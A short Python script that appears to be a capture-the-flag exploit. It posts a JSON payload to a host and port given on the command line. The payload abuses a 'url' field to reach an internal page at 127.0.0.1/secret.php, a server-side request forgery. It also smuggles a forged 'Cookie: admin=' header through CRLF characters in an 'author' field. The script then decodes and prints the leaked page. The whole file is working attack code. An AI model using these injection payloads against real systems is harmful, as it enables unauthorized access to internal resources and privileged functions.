import httpx
import base64
import gzip
import sys

header = {
    "Content-Type": "application/json"
}

payload = {
    "url": "http://127.0.0.1/secret.php",
    "author": "zeroc\r\nCookie: admin=" + base64.b64encode(b'true').decode()
}

target = f"http://{sys.argv[1]}:{sys.argv[2]}/"

r = httpx.post(target, headers=header, json=payload)
text = r.text[r.text.find("base64")+7:r.text.find("</body>")-4]
text = base64.b64decode(text)
text = gzip.decompress(text).decode()
print(text)
